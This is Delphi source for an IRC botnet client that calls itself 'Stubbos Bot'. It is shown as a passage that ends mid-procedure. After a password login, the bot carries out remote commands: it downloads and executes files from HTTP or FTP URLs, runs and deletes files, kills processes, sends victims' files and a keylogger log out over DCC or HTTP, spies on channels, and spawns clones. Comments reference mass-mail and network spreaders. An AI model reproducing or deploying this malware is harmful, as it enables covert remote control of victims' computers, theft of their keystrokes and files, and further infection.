unit untBot;

interface

uses
  Windows,
  Winsock,
  untFunctions,
  untDCC,
  MD5,
  SHellAPI,
  untPlugin,
  untHTTPDownload,
  untHTTPServer,
  untFTPDownload;

{$i config.ini}

Type
  TBotClone     = Record
    Server      :String;
    Port        :Integer;
    Channel     :String;
    Key         :String;
    Password    :String;
    IsSpy       :Bool;
  End;
  PBotClone     = ^TBotClone;

  TBotIRC       = Class(TObject)
  Private
    Procedure SplitParam(Data: String);
//    Function IsNumeric(Str: String; Bool);
  Public
    FromNick    :String;
    FromChan    :String;
    FromHost    :String;
    RecvText    :String;
    SChan       :String;
    SChanTo     :String;
    Cmd         :String;
    LoggedHost  :String;
    LoggedName  :String;
    SeenNicks   :String;

    Params      :Array[0..9000] Of String;

    SpyOn       :Bool;
    Silence     :Bool;
    IsCmd       :Bool;
    LoggedIn    :Bool;

    Sock        :TSocket;

    {$IFDEF LOG_IRCNAMES}Procedure KnowNick(Nick: String);{$ENDIF}
    Procedure ParseInfo(Data: String);
    Function ReceiveData: Bool;
  End;

  TSock         = Class(TObject)
  Private
    ServerName  :String;
    Sock        :TSocket;
    Addr        :TSocKAddrIn;
    dWSA        :TWSAData;
  Public
    Server      :String;
    Nick        :String;
    Channel     :String;
    Key         :String;
    Password    :String;
    CurTopic    :String;
    BotHost     :String;

    Port        :Integer;

    IsChat      :Bool;
    IsSpy       :Bool;
    IsClone     :Bool;

    IRC         :TBOTIRC;

    Procedure SendInfo;
    Procedure DoCommands;
    Procedure SendRawData(Text: String);
    Procedure ReadCommands(Data: String; aSock: TSocket);
    Procedure SendData(Data: String; Chat: Bool; aSock: TSocket);

    Function StartUP: Bool;
    Function Connect: Bool;
    Function DownloadFile(urlFrom, urlTo: String): Integer;
    Function DoPlugin(DLLName: String; AddData: String): Bool;
  End;

Var
  Info          :TBOTClone;
  Bot           :TSock;
  Clones        :Integer;
  DefaultSock   :TSocket;

implementation

Uses
  untScriptEngine;
//  DCPP_SPREADER, IRC_SPREADER, MASSMAIL_SPREADER, MYDOOM_SPREADER,
//  NETBIOS_SPREADER, P2P_SPREADER, PE_SPREADER;

Function MakeClone(P: Pointer): DWord; STDCALL;
Var
  Clone         :TSock;
Begin
  Clone := TSock.Create;
  Clone.IsClone := True;
  Clone.Server :=   pBotClone(P)^.Server;
  Clone.Port :=     pBotClone(P)^.Port;
  Clone.Nick :=     ReplaceShortCut(BOT_NAMETAG + RANDIRCBOT);
  Clone.Channel :=  pBotClone(P)^.Channel;
  Clone.Key :=      pBotClone(P)^.Key;
  Clone.Password := pBotClone(P)^.Password;
  Clone.IsSpy :=    pBotClone(P)^.IsSpy;
  Clone.StartUp;

  // Clone "Clones" has disconnected.

  Dec(Clones);
  Result := 0;
End;

Procedure CloneMyBot(Server, Channel, Key, Password: String; Port: Integer; dSpy: Bool);
Var
  ThreadID      :THandle;
Begin
  If (Clones >= BOT_MAXCLONE) Then
  Begin
    // You have already reached your maximum [spy]bot-clone limit.
    Exit;
  End;

  Inc(Clones);
  Info.Server := Server;
  Info.Port := Port;
  Info.Channel := Channel;
  Info.Key := Key;
  Info.Password := Password;
  Info.IsSpy := dSpy;

  CreateThread(NIL, 0, @MakeClone, @Info, 0, ThreadID);
  // Bot "Clones" has been created.
End;

{$IFDEF LOG_IRCNAMES}
Procedure TBOTIRC.KnowNick(Nick: String);
Var
  Path  :String;
  F     :TextFile;
Begin
  If (Pos('serv', LowerCase(Nick)) > 0) Then Exit;
  If (Pos('irc', LowerCase(Nick)) > 0) Then Exit;
  If (Pos('global', LowerCase(Nick)) > 0) Then Exit;
  If Nick = '' Then Exit;

  If (Pos(LowerCase(Nick), LowerCase(SeenNicks)) = 0) Then
  Begin
    SeenNicks := SeenNicks + Nick + ':';
    Path := GetDirectory(0) + '\' + IRC_NICKNAMEFILE;

    If (FileExists(Path)) Then
    Begin
      AssignFile(F, Path);
      Append(F);
        Write(F, Nick+':');
      CloseFile(F);
    End Else
    Begin
      AssignFile(F, Path);
      ReWrite(F);
        Write(F, Nick+':');
      CloseFile(F);
    End;
  End;
End;
{$ENDIF}

{$IFDEF SUPPORT_PLUGIN}
Function TSock.DoPlugin(DLLName: String; AddData: String): Bool;
Var
  Path          :String;
  Data          :String;
  ThreadID      :DWord;
Begin
  Data := IRC.FromNick + '!' + IRC.FromHost + '?' + IRC.FromChan + ' ' + AddData;
  Path := GetDirectory(0) + DLLName;

  Result := True;
  If (FileExists(Path)) Then
  Begin
    PData.DLLName := Path;
    PData.Data := Data;
    CreateThread(NIL, 0, @LoadPlugin, @PData, 0, ThreadID);
  End Else
    Result := False;
End;
{$ENDIF}

Procedure tSock.SendRawData(Text: String);
Begin
  If (Text[Length(Text)] <> #10) Then Text := Text + #10;
  If (Not IRC.Silence) Then
    Send(Sock, Text[1], Length(Text), 0);
End;

Function TSock.DownloadFile(urlFrom, urlTo: String): Integer;
Begin
  Result := 0;
  DownloadFileFromURL(urlFrom, urlTo);
End;

Procedure TSock.SendData(Data: String; Chat: Bool; aSock: TSocket);
Begin
  ReplaceShortCut(Data);

  If (Chat) Then
    Delete(Data, 1, Pos(':', Data));

  If (Pos('PRIVMSG', Data) > 0) or (Chat) Then
  Begin
    If (Not IRC.Silence) Then
      Send(aSock, Data[1], Length(Data), 0);
  End Else
    Send(aSock, Data[1], Length(Data), 0);
End;

Procedure tSock.ReadCommands(Data: String; aSock: TSocket);
Var
  Temp          :String;
  Buf           :String;
  Backup        :String;
  Port2         :String;
  fName         :String;

  LoggN         :String;
  LoggH         :String;
  FromN         :String;
  FromH         :String;
  FromC         :String;

  BotCommand    :String;

  CloneBot      :tSock;

  Length_       :Integer;
  I             :Integer;

  FileTransfer  :TFileTransfer;

  TempSock      :TSocket;

  LoggI         :Bool;

  pInfo         :PROCESS_INFORMATION;
  sInfo         :STARTUPINFO;
Begin
  If (aSock <> Sock) Then
    TempSock := aSock
  Else
    TempSock := Sock;

  FileTransfer := TFIleTransfer.Create;

  While (Pos(#10, Data) > 0) Do
  Begin
    Temp := Copy(Data, 1, Pos(#10, Data)-1);
    Data := Copy(Data, Pos(#10, Data) + 1, Length(Data));

    IRC.ParseInfo(Temp);
    If (IsBanned(IRC.FromHost)) Then Exit;

    If (IRC.Params[0] = 'PING') Then
    Begin
      Buf := 'PONG ' + IRC.Params[1] + #10;
      Send(tempSock, Buf[1], Length(Buf), 0);
    End;

    If (IRC.IsCmd) Then
    Begin
      {$IFDEF SUPPORT_TOPICCMD}
        If (IRC.CMD = '332') Then
        If (CurTopic = Temp) Then
        Begin
          CurTopic := Temp;

          Data := Temp;
          Delete(Data, 1, 1);

          Data := Copy(Data, Pos(':', Data)+1, Length(Data));
          Delete(Data, Length(Data), 1);

          Data := ':! PRIVMSG # :'+Data+#10;

          FromN := IRC.FromNick;
          FromC := IRC.FromChan;
          FromH := IRC.FromHost;

          LoggN := IRC.LoggedName;
          LoggH := IRC.LoggedHost;
          LoggI := IRC.LoggedIn;

          IRC.FromNick := '';
          IRC.FromChan := '#';
          IRC.FromHost := '';
          IRC.LoggedHost := '';
          IRC.LoggedName := '';
          IRC.LoggedIn := True;

          ReadCommands(Data, tempSock);

          IRC.FromNick := FromN;
          IRC.FromChan := FromC;
          IRC.FromHost := FromH;
          IRC.LoggedHost := LoggH;
          IRC.LoggedName := LoggN;
          IRC.LoggedIn := LoggI;
        End;
      {$ENDIF}

      If (IRC.CMD = '433') Then
      Begin
        Buf := ReplaceShortCut('NICK '+BOT_NAMETAG + RANDIRCBOT + #10);
        SendData(Buf, IsChat, tempSock);
      End;

      If (IRC.CMD = '366') Then
      Begin
        Buf := 'USERHOST '+IRC.Params[2]+#10;
        SendData(Buf, IsChat, tempSock);
        Nick := IRC.Params[2];
      End;

      If (IRC.CMD = '302') Then
      Begin
        Backup := Copy(IRC.Params[3], Pos('@', IRC.Params[3])+1, 159);
        BotHost := Backup;
      End;

      If (Pos('001', Temp) > 0) or
         (Pos('005', Temp) > 0) Then
         Begin
           If (IsSpy) Or (IsClone) Then
           Begin

             Buf := 'JOIN ' + Channel + ' ' + KEY + #10;
             SendData(Buf, IsChat, tempSock);

           End Else
           Begin

             Buf := 'JOIN ' + BOT_CHANNEL + ' ' + BOT_KEY + #10;
             SendData(Buf, IsChat, tempSock);

           End;
         End;

    End Else
    Begin
      If (Pos('MOTD', Temp) > 0) Or
         (Pos('message of the day', LowerCase(Temp)) > 0) Then
         Begin
           If (IsSpy) Or (IsClone) Then
           Begin

             Buf := 'JOIN ' + Channel + ' ' + KEY + #10;
             SendData(Buf, IsChat, tempSock);

           End Else
           Begin

             Buf := 'JOIN ' + BOT_CHANNEL + ' ' + BOT_KEY + #10;
             SendData(Buf, IsChat, tempSock);

           End;
         End;

      If (IRC.Params[1] = 'MODE') Then
        If (IRC.Params[4] = NICK) Then
        Begin
          {$IFDEF CHANGETOPIC}
            If (IRC.Params[3] = '+o') Then
            Begin
              Buf := 'TOPIC ' + IRC.Params[2] + ' :' + BOT_SETTOPIC + #10;
              SendData(Buf, IsChat, tempSock);
            End;
          {$ENDIF}

          {$IFDEF SENDMSG}
            If (IRC.Params[3] = '-o') Then
            Begin
              Buf := 'PRIVMSG ' + IRC.FromNick + ' :' + BOT_SENDPM + #10;
              SendData(Buf, IsChat, tempSock);
            End;

            If (IRC.Params[3] = '+v') Then
            Begin
              Buf := 'PRIVMSG ' + IRC.FromNick + ' :' + BOT_SENDPM_VOICE + #10;
              SendData(Buf, IsChat, tempSock);
            End;

            If (IRC.Params[3] = '-v') Then
            Begin
              Buf := 'PRIVMSG ' + IRC.FromNick + ' :' + BOT_SENDPM_DEVOICE + #10;
              SendData(Buf, IsChat, tempSock);
            End;
          {$ENDIF}
        End;

      If (IRC.Params[1] = 'PART') Or
         (IRC.Params[1] = 'QUIT') Then
         Begin
           If (IRC.FromNick = IRC.LoggedName) Then
           Begin
             IRC.LoggedHost := '';
             IRC.LoggedName := '';
             IRC.LoggedIn := FALSE;
           End;
         End;

      If (IRC.Params[1] = 'KICK') Then
      Begin
        If (IRC.Params[3] = NICK) THen
        Begin
          If (IsSpy) or (IsClone) Then
          Begin
            Buf := 'JOIN '+CHANNEL+' '+KEY+#10;
            SendData(Buf, IsChat, tempSock);
            Buf := 'PRIVMSG '+CHANNEL+' :'+BOT_KICKMSG+#10;
            SendData(Buf, IsChat, tempSock);
          End Else
          Begin
            Buf := 'JOIN '+BOT_CHANNEL+' '+BOT_KEY+#10;
            SendData(Buf, IsChat, tempSock);
            Buf := 'PRIVMSG '+BOT_CHANNEL+' :'+BOT_KICKMSG+#10;
            SendData(Buf, IsChat, tempSock);
          End;
        End;

        If (IRC.Params[3] = IRC.LoggedName) Then
        Begin
          IRC.LoggedHost := '';
          IRC.LoggedName := '';
          IRC.LoggedIn := False;
        End;
      End;

      If (IRC.Params[1] = 'PRIVMSG') Then
      Begin
        {$IFDEF REPLY_PING}
          If (Copy(IRC.RecvText, 1, 5) = #1'PING') Then
          Begin
            Buf := COpy(IRC.RecvText, 6, Length(IRC.RecvText));
            Delete(Buf, Length(Buf), 1);
            Buf := 'NOTICE ' + IRC.FromNick + ' :'#1'PING' + Buf + #1#10;
            SendData(Buf, IsChat, tempSock);
          End;
        {$ENDIF}

        {$IFDEF REPLY_VERSION}
          If (IRC.RecvText = #1'VERSION'#1) Then
          Begin
            {$IFDEF REPLY_FAKEVERSION}
              Buf := 'NOTICE ' + IRC.FromNick + ' :'#1'VERSION '+ BOT_FAKEVERSION + #10;
              SendData(Buf, IsChat, tempSock);
            {$ENDIF}
            {$IFDEF REPLY_REALVERSION}
              Buf := 'NOTICE ' + IRC.FromNick + ' :'#1'VERSION '+ BOT_REALVERSION + #10;
              SendData(Buf, IsChat, tempSock);
            {$ENDIF}
          End;
        {$ENDIF}



              If (LowerCase(IRC.Params[3]) = ':' + BOT_PREFIX + BOT_COMMAND_LOGIN) Then
                {$IFDEF SUPPORT_DEFINEDHOST} If (IRC.FromHost = BOT_LOGIN_HOST) THen {$ENDIF}
                  If (IRC.Params[4] = BOT_PASSWORD) Then
                  Begin
                    If (Not IRC.LoggedIn) Then
                    Begin
                      Buf := 'PRIVMSG ' + IRC.FromChan + ' :[Login]: Successfull'#10;
                      SendData(Buf, IsChat, tempSock);

                      IRC.LoggedIn := TRUE;
                      IRC.LoggedName := IRC.FromNick;
                      IRC.LoggedHost := IRC.FromHost;
                      {$IFDEF BAN_AFTER_FAILURE}
                        RemoveFailure(IRC.FromHost);
                      {$ENDIF}
                    End;
                  End Else
                  Begin
                    {$IFDEF REPORT_FAILURE}
                      {$IFDEF BAN_AFTER_FAILURE}
                        LoginFailure(IRC.FromHost);
                      {$ENDIF}

                      Buf := 'PRIVMSG ' + IRC.LoggedName + ' :[Login] Failed login attempt from ['+IRC.FromNick+'!'+IRC.FromHost+']';
                      If (Copy(IRC.FromChan, 1, 1) = '#') Then
                        Buf := Buf + ' @ '+ IRC.FromChan + #10
                      Else
                        Buf := Buf + #10;
                      SendData(Buf, IsChat, tempSock);
                    {$ENDIF}
                  End;

              If (IRC.LoggedIn) Then
                If (IRC.FromNick <> IRC.LoggedName) Then
                  If (IRC.FromChan <> BOT_CHANNEL) Then
                    If (Pos('login', LowerCase(IRC.RecvText)) > 0) Then
                    Begin
                      Buf := 'PRIVMSG '+IRC.LoggedName+' :('+IRC.FromChan+') ['+IRC.FromNick+'!'+IRC.FromHost+'] '+IRC.RecvText +#10;
                      SendData(Buf, IsChat, tempSock);
                    End;

              If (IsSpy) And (IRC.FromChan = Channel) Then
              Begin
                Buf := 'PRIVMSG '+BOT_CHANNEL+' :['+IRC.FromChan+' @ '+Server+']['+IRC.FromNick+'!'+IRC.FromHost+']: '+IRC.RecvText+#10;
                SendData(Buf, FALSE, DefaultSock);
              End;

              If (IRC.SpyOn) Then
                If (IRC.FromChan = IRC.SChan) Then
                Begin
                  Buf := 'PRIVMSG ' + IRC.SChanTo + ' :(' + IRC.SChan + ') [' + IRC.FromNick + '!' +
                          IRC.FromHost + ']: ' + IRC.RecvText + #10;
                  SendData(Buf, IsChat, tempSock);
                End;

              If (IRC.LoggedIn) Then
                If (IRC.FromNick = IRC.LoggedName) Then
                  If (IRC.FromHost = IRC.LoggedHost) Then
                    Begin

                      BotCommand := LowerCase(IRC.Params[3]);
                      Delete(BotCommand, 1, 1);

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_RMTSPY) Then
                      Begin
                        If (IRC.Params[4] = '*') Then IRC.Params[4] := '';
                        If (IRC.Params[5] = '*') Then IRC.Params[5] := '';
                        If (IRC.Params[6] = '*') Then IRC.Params[6] := '';
                        If (IRC.Params[7] = '*') Then IRC.Params[7] := '';
                        If (IRC.Params[8] = ' ') Then IRC.Params[8] := '6667';

                        If (IRC.Params[4]<> '') Then
                          CloneMyBot( IRC.Params[4],
                                      IRC.Params[5],
                                      IRC.Params[6],
                                      IRC.Params[7],
                                      StrToInt(IRC.Params[8]), TRUE);
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_NEWNICK) Then
                      Begin
                        Buf := 'NICK ' + BOT_NAMETAG + RANDIRCBOT + #10;
                        ReplaceStr('%rand%', IntToStr(Random($FFFFFFFF)), Buf);
                        ReplaceStr('%host%', GetLocalName, Buf);
                        SendData(Buf, IsChat, tempSock);
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_OPME) Then
                      Begin
                        Buf := 'MODE ' + IRC.FromChan + ' +o ' + IRC.FromNick + #10;
                        SendData(Buf, IsChat, tempSock);
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_RESTART) Then
                      Begin
                        Buf := 'QUIT :' + BOT_QUITMESSAGE + #10;
                        SendData(Buf, IsChat, tempSock);
                        Sleep(800);

                        If (IsNUmeric(IRC.Params[4])) Then
                          Sleep(StrToInt(IRC.Params[4]))
                        Else
                          Sleep(1800000);

                        If (IsClone) THen
                          CloneMyBot(Server, Channel, Key, Password, Port, IsSpy);
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_DIE) Then
                      Begin
                        Buf := 'QUIT :' + BOT_QUITMESSAGE + #10;
                        SendData(Buf, IsChat, tempSock);
                        Sleep(800);

                        If (IsClone) Then
                          CloseSocket(Sock)
                        Else
                          ExitProcess(0);
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_KILLCLONE) Then
                        If (IsClone) Then
                        Begin
                          Buf := 'QUIT :'+ BOT_QUITMESSAGE + #10;
                          SendData(Buf, IsChat, tempSock);
                          Sleep(800);

                          CloseSocket(Sock);
                        End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_LOGOUT) Then
                      Begin
                        IRC.LoggedHost := '';
                        IRC.LoggedName := '';
                        IRC.LoggedIn := FALSE;

                        Buf := 'PRIVMSG ' + IRC.FromChan + ' :[Logout] Successfull'#10;
                        SendData(Buf, IsChat, tempSock);
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_INFO) Then
                      Begin
                        Buf := 'PRIVMSG ' + IRC.FromChan + ' :' + GetInfo + #10;
                        SendData(Buf, IsChat, tempSock);
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_SILENCE) Then
                      Begin
                        IRC.Silence := Boolean(StrToInt(IRC.Params[4]));
                      End;

                      If (Pos('DCC CHAT', IRC.RecvText) > 0) Then
                      Begin
                        Buf := IRC.RecvText;
                        Buf := Copy(Buf, Pos('DCC CHAT', Buf) + 9, Length(Buf));

                        If (Buf[1] = ' ') Then
                          Delete(Buf, 1, 1);

                        Delete(Buf, 1, Pos(' ', Buf) -1);
                        IRC.SplitParam(Buf);

                        FileTransfer.AcceptChat(IRC.FromNick, IRC.FromHost, IRC.Params[0], StrToInt(IRC.Params[1]));
                      End;

                      If (Pos('DCC SEND', IRC.RecvText) > 0) Then
                      Begin
                        Buf := IRC.RecvText;
                        Buf := Copy(Buf, Pos('DCC SEND', Buf) + 9, Length(Buf));

                        If (Buf[1] = ' ') Then
                          Delete(Buf, 1, 1);

                        IRC.SplitParam(Buf);

                        FileTransfer.ReceiveFile(IRC.Params[0], StrToInt(IRC.Params[2]), IRC.Params[1], Sock);
                        Buf := 'PRIVMSG ' + IRC.FromChan + ' :[DCC Transfer] Accepted ('+IRC.Params[0]+' | '+GetKBS(StrToInt(IRC.Params[1]))+') on port ('+IRC.Params[2]+')'#10;

                        SendData(Buf, IsChat, tempSock);
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_KILLPROC) Then
                      Begin
                        If (KillProc(IRC.Params[4])) Then
                          Buf := '[Proc] Killed Process #'+IRC.Params[4]+#10
                        Else
                          Buf := '[Proc] Failed to kill #'+IRC.Params[4]+#10;

                        Buf := 'PRIVMSG ' + IRC.FromChan + ' :' + Buf;
                        SendData(Buf, IsChat, tempSock);
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_LISTPROC) Then
                      Begin
                        Backup := ListProc;
                        {$IFDEF SUPPORT_DCC}
                          Randomize;
                          Port2 := IntToStr(Random($FFFFFF)+100);

                          Buf           := 'PRIVMSG ' + IRC.FromNick + ' :'#1'DCC SEND ';
                          fName         := Backup;
                          Length_       := GetFileSize(Backup);
                          Backup        := ExtractFileName(Backup);

                          For I := 1 To Length(Backup) Do
                            If (Backup[i] = #32) Then
                              Backup[i] := #95;

                          Buf := Buf + Backup + ' ' + IntToStr(hTonl(Inet_Addr(pChar(GetLocalIP)))) + ' ' + Port2 + ' ' + IntToStr(Length_)+#1#10;
                          SendData(Buf, False, Sock);

                          FileTransfer.SendFile(fName, StrToInt(Port2), Length_);
                        {$ELSE}
                          ReadFileStr(Backup, Buf);

                          While (Pos(#10, Buf) > 0) Do
                          Begin
                            Backup := '';
                            Backup := Copy(Buf, 1, Pos(#10, Buf)-1);
                            Buf := Copy(Buf, Pos(#10, Buf)+1, Length(Buf));

                            If (Backup <> '') Then
                            Begin
                              ReplaceStr(#32, #0160, Backup);
                              Backup := 'PRIVMSG ' + IRC.FromNick + ' :' + Backup + #10;
                              SendData(Backup, IsChat, tempSock);
                              Sleep(800);
                            End;
                          End;
                        {$ENDIF}
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_LISTDIR) Then
                      Begin
                        ListDirectory(IRC.Params[4], Backup, IRC.params[5]);
                        {$IFDEF SUPPORT_DCC}
                          Randomize;
                          Port2 := IntToStr(Random($FFFFFF)+100);

                          Buf           := 'PRIVMSG ' + IRC.FromNick + ' :'#1'DCC SEND ';
                          fName         := Backup;
                          Length_       := GetFileSize(Backup);
                          Backup        := ExtractFileName(Backup);

                          For I := 1 To Length(Backup) Do
                            If (Backup[i] = #32) Then
                              Backup[i] := #95;

                          Buf := Buf + Backup + ' ' + IntToStr(hTonl(Inet_Addr(pChar(GetLocalIP)))) + ' ' + Port2 + ' ' + IntToStr(Length_)+#1#10;
                          SendData(Buf, False, Sock);

                          FileTransfer.SendFile(fName, StrToInt(Port2), Length_);
                        {$ELSE}
                          ReadFileStr(Backup, Buf);

                          While (Pos(#10, Buf) > 0) Do
                          Begin
                            Backup := '';
                            Backup := Copy(Buf, 1, Pos(#10, Buf)-1);
                            Buf := Copy(Buf, Pos(#10, Buf)+1, Length(Buf));

                            If (Backup <> '') Then
                            Begin
                              ReplaceStr(#32, #0160, Backup);
                              Backup := 'PRIVMSG ' + IRC.FromNick + ' :' + Backup + #10;
                              SendData(Backup, IsChat, tempSock);
                              Sleep(800);
                            End;
                          End;
                        {$ENDIF}
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_GETFILE) Then
                      Begin
                        Randomize;
                        Port2 := IntToStr(Random($FFFFFF)+100);

                        Buf := 'PRIVMSG ' + IRC.FromNick + ' :'#1'DCC SEND ';

                        Backup := IRC.RecvText;
                        Delete(Backup, 1, Length(BOT_PREFIX) + Length(BOT_COMMAND_GETFILE) + 1);

                        fName := Backup;
                        Length_ := GetFileSize(Backup);
                        Backup := ExtractFileName(Backup);

                        For I := 1 TO Length(Backup) Do
                          If (Backup[I] = #32) Then
                            Backup[I] := #95;

                        Buf := Buf + Backup + ' ' + IntToStr(hTonl(Inet_Addr(pChar(GetLocalIP)))) + ' ' + Port2 + ' ' + IntToStr(Length_) + #1#10;
                        SendData(Buf, False, Sock);

                        FileTransfer.SendFile(fName, StrToInt(Port2), Length_);
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_FTP_DOWNLOAD) Then
                        DownloadFileFromFTP(IRC.Params[4], IRC.Params[5], IRC.Params[6], IRC.Params[7], StrToInt(IRC.Params[8]));

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_FTP_UPDATE) Then
                        UpdateFileFromFTP(IRC.Params[4], IRC.Params[5], IRC.Params[6], IRC.Params[7], StrToInt(IRC.Params[8]));

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_FTP_EXECUTE) Then
                        ExecuteFileFromFTP(IRC.Params[4], IRC.Params[5], IRC.Params[6], IRC.Params[7], StrToInt(IRC.Params[8]));

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_HTTP_DOWNLOAD) Then
                        DownloadFileFromURL(IRC.Params[4], IRC.Params[5]);

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_HTTP_UPDATE) Then
                        UpdateFileFromURL(IRC.Params[4], IRC.Params[5]);

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_HTTP_EXECUTE) Then
                        ExecuteFileFromURL(IRC.Params[4], IRC.Params[5]);

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_HTTP_SERVER) Then
                        StartWebServer(StrToInt(IRC.Params[4]));

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_GETLOG) Then
                      Begin
                        Buf := GetDirectory(0) + BOT_KEYLOGG_NAME;
                        Delete(Buf, 1, 3);

                        ReplaceStr('\', '/', Buf);

                        Buf := 'PRIVMSG ' + IRC.FromChan + ' :[URL: http://' + GetLocalIP + ':81/' + Buf + '] or [' + BOT_PREFIX + BOT_COMMAND_GETFILE + ' ' + GetDirectory(0) + BOT_KEYLOGG_NAME + ']'#10;
                        SendData(Buf, IsChat, tempSock);
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_SPYOFF) Then
                      Begin
                        If (IRC.SpyOn) Then IRC.SpyOn := False;

                        Buf := 'PART ' + IRC.SChan + #10;
                        SendData(Buf, IsChat, tempSock);
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_SPYON) Then
                      Begin
                        If (IRC.SpyOn) Then
                        Begin
                          Buf := 'PART '+IRC.SChan + #10;
                          SendData(Buf, IsChat, tempSock);
                        End;

                        IRC.SChanTo := IRC.Params[5];
                        IRC.SpyOn := True;
                        IRC.SChan := IRC.Params[4];

                        Buf := 'JOIN '+IRC.SChan + #10;
                        SendData(Buf, IsChat, tempSock);
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_CLONE) Then
                      Begin
                        If (IRC.Params[4] = '*') Then IRC.Params[4]  := '';
                        If (IRC.Params[5] = '*') Then IRC.Params[5]  := '';
                        If (IRC.Params[6] = '*') Then IRC.Params[6]  := '';
                        If (IRC.Params[7] = '*') Then IRC.Params[7]  := '';
                        If (IRC.Params[8] = '' ) Then IRC.Params[8]  := '6667';
                        If (IRC.Params[9] = '*') Then IRC.Params[9] := '1';
                        If (IRC.Params[9] = '' ) Then IRC.Params[9] := '1';

                        ReplaceShortCut(IRC.Params[4]);

                        If Not (IsNumeric(IRC.Params[9])) Then IRC.Params[9] := '1';

                        If StrToInt(IRC.Params[9]) > BOT_MAXCLONE Then IRC.Params[9] := IntToStr(BOT_MAXCLONE);

                        If (IRC.Params[4] <> '') Then
                        For I := 0 To StrToInt(IRC.Params[9])-1 Do
                          CloneMyBot(IRC.Params[4], IRC.Params[5], IRC.Params[6],
                                     IRC.Params[7], StrToInt(IRC.Params[8]), False);
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_RAW) Then
                      Begin
                        Buf := IRC.RecvText;
                        Delete(Buf, 1, Length(BOT_PREFIX) + Length(BOT_COMMAND_RAW)+1);

                        Buf := Buf + #10;
                        SendData(Buf, IsChat, tempSock);
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_PLUGIN) Then
                      Begin
                        Buf := 'PRIVMSG ' + IRC.FromChan + ' :Plugin Support Is Deactivated.'#10;

                        {$IFDEF SUPPORT_PLUGIN}
                          If (FileExists(IRC.Params[4])) Then
                          Begin
                            Buf := IRC.RecvText;
                            Delete(Buf, 1, Pos(IRC.Params[5], Buf) -1);

                            If DoPlugin(IRC.Params[4], Buf) Then
                              Buf := 'PRIVMSG ' + IRC.FromChan + ' :[Plugin] Loaded Successfully'#10
                            Else
                              Buf := 'PRIVMSG ' + IRC.FromChan + ' :[Plugin] Failed to load'#10;
                          End Else
                            Buf := 'PRIVMSG ' + IRC.FromChan + ' :[Plugin] Failed to load, No such file'#10;
                        {$ENDIF}

                        SendData(Buf, IsChat, tempSock);
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_EXECUTE) Then
                         Begin
                           Buf := IRC.RecvText;
                           Delete(Buf, 1, Length(BOT_PREFIX) + Length(BOT_COMMAND_EXECUTE) + 1);

                           If (FileExists(Buf)) Then
                           Begin
                             ShellExecute(0, 'open', pChar(Buf), NIL, NIL, SW_SHOW);
                             Buf := 'PRIVMSG ' + IRC.FromChan + ' :[Execute] Executed Successfully'#10
                           End Else
                             Buf := 'PRIVMSG ' + IRC.FromChan + ' :[Execute] Error: File Doesnt Exist'#10;

                           SendData(Buf, IsChat, tempSock);
                         End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_DELETE) Then
                      Begin
                        Buf := IRC.RecvText;
                        Delete(Buf, 1, Length(BOT_PREFIX) + Length(BOT_COMMAND_EXECUTE) + 1);

                        If (FileExists(Buf)) Then
                        Begin
                          If (DeleteFile(pChar(Buf))) Then
                            Buf := 'PRIVMSG ' + IRC.FromChan + ' :[Delete] Deleted Successfully'#10
                          Else
                            BUf := 'PRIVMSG ' + IRC.FromChan + ' :[Delete] Error: Cant delete file'#10;
                        End Else
                          Buf := 'PRIVMSG ' + IRC.FromChan + ' :[Delete] Error: File Doesnt Exist'#10;

                        SendData(Buf, IsChat, tempSock);
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_UNINSTALL) Then
                      Begin
                        DoUninstall;

                        Buf := 'QUIT :Uninstalled! Stubbos Bot!'#10;
                        SendData(Buf, IsChat, tempSock);

                        Sleep(800);
                        ExitProcess(0);
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_NICK) Then
                      Begin
                        ReplaceStr('%rand%', IntToStr(Random($FFFFFFFF)), IRC.Params[4]);
                        ReplaceStr('%host%', GetLocalName, IRC.Params[4]);
                        SendData('NICK '+IRC.Params[4]+#10, False, Sock);
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_JOIN) Then
                        SendData('JOIN '+IRC.Params[4]+' '+IRC.Params[5]+#10, False, Sock);

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_PART) Then
                        SendData('PART '+IRC.Params[4]+#10, False, Sock);

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_MODE) Then
                      Begin
                        Backup := IRC.RecvText;
                        Delete(Backup, 1, Pos(' ', Backup));

                        If (Copy(Backup, 1, 1) = ' ') Then
                          Delete(Backup, 1, 1);

                        Buf := 'MODE ' + Backup + #10;
                        SendData(Buf, False, Sock);
                      End;

                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_CYCLE) Then
                        SendData('PART ' + IRC.FromChan + #10 +
                                 'JOIN ' + IRC.FromChan + ' ' + Key + #10,
                                 False, Sock);

